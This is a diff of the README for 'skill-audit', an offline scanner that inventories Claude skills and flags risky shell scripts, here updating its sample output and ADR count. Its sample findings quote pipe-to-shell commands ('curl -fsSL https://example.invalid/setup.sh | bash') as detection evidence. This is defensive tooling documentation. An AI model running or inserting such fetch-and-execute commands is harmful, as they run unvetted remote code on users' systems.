@@ -22,18 +22,19 @@ cd ~/code/my-project
 skill-audit scan
 ```
 
-`scan` inventories your global Claude skills (`~/.claude`) and the project skills under the current folder, audits them offline, and saves `inventory.json` and `report.json` in a new folder under `~/.skill-audit/reports/`. Run it from a parent folder such as `~/code` to cover several projects at once. It never changes your skills, never records history and never uses the network ([ADR-0016](docs/adr/0016-one-command-scan.md)). Output from a fixture home, with paths shortened:
+`scan` inventories your global Claude skills (`~/.claude`) and the project skills under the current folder, audits them offline, and saves `inventory.json` and `report.json` in a new folder under `~/.skill-audit/reports/`. Run it from a parent folder such as `~/code` to cover several projects at once. It never changes your skills, never records history and never uses the network ([ADR-0016](docs/adr/0016-one-command-scan.md)). Text lists only skills that need attention: upstream matches, findings, gaps or baseline changes. Every other skill is counted in the summary, and `report.json` lists them all ([ADR-0018](docs/adr/0018-compact-text-output.md)). Output from a fixture home with three skills, with paths shortened:
 
 ```text
 scan roots=["~/.claude" "~/code/app"]
-audit skills=2 complete=true discovery_complete=true
+audit skills=3 complete=true discovery_complete=true
 global "~/.claude/skills/brand-guidelines" correlation=exact lineage=not_compared
-candidate="brand-guidelines" repository="https://github.com/anthropics/skills" commit="dbd4588f9e1033efb41dad4bef2f7947c8993d44" upstream_path="skills/brand-guidelines" basis="observed_exact_match" score=1.000 shared=0 union=0
+candidate="brand-guidelines" repository="https://github.com/anthropics/skills" commit="dbd4588f9e10" basis="observed_exact_match" score=1.000
 project "~/code/app/.claude/skills/deploy" correlation=unknown lineage=not_compared
 scanner=skill-audit version="SA001/v3;sh/v3.10.0;scope/v2;identity/v2" status=completed_with_findings message="" analyzed=1 outside_scope=1
 skill-audit/"SA001" high "scripts/setup.sh":1 change=not_compared evidence="curl -fsSL https://example.invalid/setup.sh | bash"
-summary skills=2 global=1 project=1 machine=0 exact=1 possible_modified=0 ambiguous=0 unknown=1 findings=1 complete=true
-saved inventory="~/.skill-audit/reports/20261030T005832Z/inventory.json" report="~/.skill-audit/reports/20261030T005832Z/report.json"
+excluded .git=1
+summary skills=3 listed=2 global=2 project=1 machine=0 exact=1 possible_modified=0 ambiguous=0 unknown=2 findings=1 complete=true
+saved inventory="~/.skill-audit/reports/20261030T010742Z/inventory.json" report="~/.skill-audit/reports/20261030T010742Z/report.json"
 ```
 
 Run from your home folder, `scan` covers only `~/.claude` and says how to include projects. The exit codes are the [audit's](#exit-codes); here `1` because of the finding.
@@ -49,14 +50,14 @@ The demo builds the CLI and creates a temporary home with one global skill and o
 ```text
 audit skills=2 complete=true discovery_complete=true
 global ".../home/.claude/skills/brand-guidelines" correlation=exact lineage=unchanged
-candidate="brand-guidelines" repository="https://github.com/anthropics/skills" commit="dbd4588f9e1033efb41dad4bef2f7947c8993d44" upstream_path="skills/brand-guidelines" basis="observed_exact_match" score=1.000 shared=0 union=0
+candidate="brand-guidelines" repository="https://github.com/anthropics/skills" commit="dbd4588f9e10" basis="observed_exact_match" score=1.000
 project ".../projects/one/.claude/skills/web-artifacts-builder" correlation=possible_modified lineage=changed
-candidate="web-artifacts-builder" repository="https://github.com/anthropics/skills" commit="dbd4588f9e1033efb41dad4bef2f7947c8993d44" upstream_path="skills/web-artifacts-builder" basis="inferred_candidate" score=0.996 shared=245 union=246
+candidate="web-artifacts-builder" repository="https://github.com/anthropics/skills" commit="dbd4588f9e10" basis="inferred_candidate" score=0.996
 upstream_modified="scripts/bundle-artifact.sh"
 modified="scripts/bundle-artifact.sh"
 scanner=skill-audit version="SA001/v3;sh/v3.10.0;scope/v2;identity/v2" status=completed_with_findings message="" analyzed=2 outside_scope=3
 skill-audit/"SA001" high "scripts/bundle-artifact.sh":55 change=new evidence="curl -fsSL https://example.invalid/install.sh | bash"
-summary skills=2 global=1 project=1 machine=0 exact=1 possible_modified=1 ambiguous=0 unknown=0 findings=1 complete=true
+summary skills=2 listed=2 global=1 project=1 machine=0 exact=1 possible_modified=1 ambiguous=0 unknown=0 findings=1 complete=true
 recording=recorded path=".../state.json" message="observation saved"
 ```
 
@@ -136,7 +137,7 @@ Tests use temporary fixtures and fake HTTP handlers; no network, credentials or 
 - [docs/adr/](docs/adr/README.md): the binding decisions, each with acceptance scenarios.
 - [DESIGN.md](DESIGN.md), [PORTABILITY.md](PORTABILITY.md), [PRODUCT.md](PRODUCT.md): architecture, platform gaps and deferred proposals.
 
-**Why there are seventeen ADRs for a small CLI.** Early review rounds kept redefining the same rules: what counts as complete coverage, when a baseline may be compared, which exit code wins and what may be cached. The ADRs freeze those decisions, each with acceptance scenarios that map to named tests, so later changes argue against a written rule instead of reopening it. They are the contract, not extra features; [docs/history/](docs/history/README.md) keeps the superseded review records and is not policy.
+**Why there are eighteen ADRs for a small CLI.** Early review rounds kept redefining the same rules: what counts as complete coverage, when a baseline may be compared, which exit code wins and what may be cached. The ADRs freeze those decisions, each with acceptance scenarios that map to named tests, so later changes argue against a written rule instead of reopening it. They are the contract, not extra features; [docs/history/](docs/history/README.md) keeps the superseded review records and is not policy.
 
 ## License
 
